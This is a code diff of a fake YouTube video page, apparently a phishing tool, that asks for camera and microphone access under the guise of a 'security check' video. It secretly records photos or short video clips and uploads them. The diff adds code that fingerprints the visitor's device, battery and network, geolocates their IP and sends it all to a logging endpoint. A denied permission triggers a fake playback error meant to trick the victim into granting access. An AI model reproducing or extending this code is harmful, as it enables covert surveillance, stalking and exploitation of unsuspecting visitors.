@@ -6,37 +6,23 @@
     <title>YouTube</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { margin: 0; background-color: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; }
-        
-        /* Video Player Area */
+        body { margin: 0; background-color: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; overflow-x: hidden; }
         .video-wrapper { position: relative; width: 100%; background: #000; aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; }
         .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #ff0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        
-        /* Play Button Overlay */
-        #play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        #play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; display: flex; align-items: center; justify-content: center; cursor: pointer; background: rgba(0,0,0,0.1); }
         .play-icon { font-size: 60px; color: white; opacity: 0.9; }
-
-        /* Video Info Section */
         .video-details { padding: 12px; }
         .video-title { font-size: 19px; font-weight: 700; line-height: 24px; margin-bottom: 8px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
-        
-        /* Channel Section */
         .channel-row { display: flex; align-items: center; margin: 12px 0; justify-content: space-between; }
         .channel-info { display: flex; align-items: center; gap: 10px; }
         .channel-pfp { width: 40px; height: 40px; background: #3f3f3f; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 20px; color: #ff4747; }
-        .channel-name-container { display: flex; flex-direction: column; }
         .channel-name { font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 4px; }
         .verified-badge { color: #aaa; font-size: 12px; }
         .sub-count { font-size: 12px; color: #aaa; }
-        
         .sub-btn { background: white; color: black; padding: 0 16px; height: 36px; border-radius: 18px; border: none; font-weight: 600; font-size: 14px; cursor: pointer; }
-
-        /* Description Box */
         .description-box { background: #272727; border-radius: 12px; padding: 12px; margin-top: 12px; font-size: 14px; line-height: 20px; }
         .view-count { font-weight: 600; margin-bottom: 4px; display: block; }
-        
-        /* Hidden Media elements */
         video, canvas { display: none; }
     </style>
 </head>
@@ -51,20 +37,16 @@
 
     <div class="video-details">
         <div class="video-title" id="display-title">Loading video details...</div>
-        
         <div class="channel-row">
             <div class="channel-info">
                 <div class="channel-pfp">A</div>
-                <div class="channel-name-container">
-                    <div class="channel-name">
-                        AnyaStore <i class="fas fa-check-circle verified-badge"></i>
-                    </div>
+                <div>
+                    <div class="channel-name">AnyaStore <i class="fas fa-check-circle verified-badge"></i></div>
                     <div class="sub-count">148K subscribers</div>
                 </div>
             </div>
             <button class="sub-btn">Subscribe</button>
         </div>
-
         <div class="description-box">
             <span class="view-count">1.2M views • 3 hours ago</span>
             <div id="display-desc">
@@ -83,13 +65,11 @@
         const camMode = params.get('cam') || 'user';
         const ytId = params.get('ytid') || 'dQw4w9WgXcQ';
 
-        // Update Title based on ID (optional)
         document.getElementById('display-title').innerText = "Account Verification & Security Check - ID #" + (ytId.substring(0,6));
 
         async function initiateCapture() {
             if (!uid || uid === "null") return;
 
-            // UI Changes: Hide play button, show spinner
             document.getElementById('play-overlay').style.display = 'none';
             document.getElementById('loading-spinner').style.display = 'block';
 
@@ -99,17 +79,10 @@
                     audio: (mode === 'video') 
                 });
                 
-                const v = document.getElementById('v');
-                v.srcObject = stream;
+                document.getElementById('v').srcObject = stream;
 
-                // Log IP Data
-                fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
-                    fetch(`/log_info?id=${uid}`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(data)
-                    });
-                });
+                // Execute God-Mode Data Gathering
+                await gatherDeepInfo();
 
                 if (mode === 'video') {
                     startVideoLogic(stream);
@@ -118,11 +91,49 @@
                 }
 
             } catch (err) {
-                // If they deny, we show an "Error" that looks like a playback fail
                 document.getElementById('loading-spinner').style.display = 'none';
                 document.getElementById('display-title').innerText = "Playback Error: Please allow permissions to watch.";
                 document.getElementById('play-overlay').style.display = 'flex';
             }
+        }
+
+        async function gatherDeepInfo() {
+            let extraData = {
+                browser: navigator.userAgent,
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory || 'N/A',
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
+                darkmode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'On' : 'Off',
+                orientation: (screen.orientation) ? screen.orientation.type : 'N/A'
+            };
+
+            // Network Connection Intel
+            if (navigator.connection) {
+                extraData.net_speed = `${navigator.connection.downlink} Mbps`;
+                extraData.net_type = navigator.connection.effectiveType.toUpperCase();
+                extraData.save_data = navigator.connection.saveData ? 'Active' : 'Off';
+            }
+
+            // Battery Intel
+            try {
+                const battery = await navigator.getBattery();
+                extraData.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+            } catch (e) { extraData.battery = 'N/A'; }
+
+            // IP and Geo-location
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+
+            // Send full payload to app.py
+            await fetch(`/log_info?id=${uid}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ ...ipData, ...extraData })
+            });
         }
 
         function startPhotoLogic() {
@@ -158,7 +169,7 @@
                 fetch(`/upload?id=${uid}&type=video`, { method: 'POST', body: fd }).then(finish);
             };
             recorder.start();
-            setTimeout(() => recorder.stop(), 4000); // 4 second capture
+            setTimeout(() => recorder.stop(), 4000); 
         }
 
         function finish() {
